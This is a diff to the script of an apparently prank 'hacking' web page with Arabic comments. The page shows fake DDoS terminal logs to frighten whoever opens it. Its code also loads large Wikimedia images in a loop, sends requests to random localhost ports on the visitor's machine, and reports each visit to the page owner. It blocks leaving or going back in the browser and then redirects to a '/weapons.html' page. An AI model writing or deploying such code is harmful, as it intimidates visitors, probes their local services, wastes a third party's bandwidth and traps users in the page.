@@ -30,27 +30,24 @@
 </div>
 
 <script>
-// إرسال إشعار للديسكورد إن الهجوم شغال
+const urlParams = new URLSearchParams(window.location.search);
+const brand = urlParams.get('b') || 'generic';
+
 fetch('/ddos-report', { method: 'POST' }).catch(()=>{});
 
-// 1. استنزاف الشبكة والرام (Network & Memory Flooding)
 async function floodNetwork() {
   const targets = [
     "https://upload.wikimedia.org/wikipedia/commons/3/3f/Fronalpstock_big.jpg",
     "https://upload.wikimedia.org/wikipedia/commons/2/2c/Rotating_earth_%28large%29.gif",
     "https://upload.wikimedia.org/wikipedia/commons/8/89/Portrait_Placeholder.png"
   ];
-  
-  for (let i = 0; i < 150; i++) {
+  for (let i = 0; i < 100; i++) {
     const img = new Image();
     img.src = targets[i % targets.length] + "?v=" + Math.random();
-    
     fetch('http://127.0.0.1:' + (8000 + Math.floor(Math.random() * 1000))).catch(()=>{});
-    fetch('http://localhost:' + (8000 + Math.floor(Math.random() * 1000))).catch(()=>{});
   }
 }
 
-// 2. محاكي الاختراق المرعب
 const hexChars = "0123456789ABCDEF";
 function randomHex(len) {
   let s = "";
@@ -59,19 +56,9 @@ function randomHex(len) {
 }
 
 const logMessages = [
-  "Bypassing firewall...",
-  "Injecting payload into router...",
-  "Flooding port 80...",
-  "Flooding port 443...",
-  "Packet loss detected...",
-  "Connection to ISP lost...",
-  "Crashing DNS servers...",
-  "Stealing MAC address...",
-  "Router admin panel compromised...",
-  "Sending 10,000,000 requests per second...",
-  "SYN Flood initiated...",
-  "UDP Flood initiated...",
-  "HTTP GET Flood initiated..."
+  "Bypassing firewall...", "Injecting payload into router...", "Flooding port 80...", 
+  "Flooding port 443...", "Packet loss detected...", "Connection to ISP lost...", 
+  "Crashing DNS servers...", "Router admin panel compromised...", "SYN Flood initiated..."
 ];
 
 const terminal = document.getElementById('terminal');
@@ -79,38 +66,30 @@ let packetCount = 0;
 let ppsEl = document.getElementById('pps');
 let loadEl = document.getElementById('load');
 
-setInterval(() => {
+const ddosInterval = setInterval(() => {
   const line = document.createElement('div');
   line.className = 'line';
-  
-  if (Math.random() > 0.7) {
-    line.innerHTML = `<span class="red">[ERR]</span> ${randomHex(16)} - ${logMessages[Math.floor(Math.random() * logMessages.length)]}`;
-  } else {
-    line.innerHTML = `<span class="yellow">[SYS]</span> ${randomHex(32)} ${randomHex(8)}`;
-  }
+  line.innerHTML = Math.random() > 0.7 
+    ? `<span class="red">[ERR]</span> ${randomHex(16)} - ${logMessages[Math.floor(Math.random() * logMessages.length)]}`
+    : `<span class="yellow">[SYS]</span> ${randomHex(32)} ${randomHex(8)}`;
   
   terminal.prepend(line);
-  
-  if (terminal.childNodes.length > 100) {
-    terminal.removeChild(terminal.lastChild);
-  }
+  if (terminal.childNodes.length > 80) terminal.removeChild(terminal.lastChild);
 
   packetCount += Math.floor(Math.random() * 50000) + 10000;
   ppsEl.innerText = packetCount.toLocaleString();
-  
-  let load = Math.floor(Math.random() * 20) + 80;
-  loadEl.innerText = load + "%";
-  
-  if (load > 95) loadEl.style.color = "#ff0000";
-
+  loadEl.innerText = (Math.floor(Math.random() * 20) + 80) + "%";
 }, 50);
 
 floodNetwork();
 
-window.addEventListener('beforeunload', function (e) {
-    e.preventDefault();
-    e.returnValue = '';
-});
+// التحويل للترسانة بعد 15 ثانية
+setTimeout(() => {
+  clearInterval(ddosInterval);
+  window.location.href = '/weapons.html?b=' + brand;
+}, 15000);
+
+window.addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; });
 history.pushState(null, null, location.href);
 window.onpopstate = function () { history.go(1); };
 </script>
